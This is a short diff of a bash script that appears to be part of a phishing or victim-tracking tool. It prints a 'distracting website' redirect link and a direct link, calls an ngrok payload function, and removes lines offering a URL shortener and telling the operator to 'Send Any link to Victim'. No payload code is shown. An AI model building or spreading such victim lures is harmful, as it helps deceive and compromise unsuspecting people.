@@ -129,9 +129,7 @@ printf "\n"
 printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Distracting website:\e[0m\e[1;77m %s\n' $redirect_link
 printf "\n"
 printf "\e[1;91m[\e[0m*\e[1;91m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-printf '\e[1;91m[\e[0m\e[1;77m*\e[0m\e[1;91m] Or using 4th url shortener (https://4h.net/):\e[0m\e[1;77m %s \n' $send_ip
 
-printf "\e[1;91m[\e[0m*\e[1;91m] Send Any link to Victim...\n"
 printf "\n"
 payload_ngrok
 checkfound
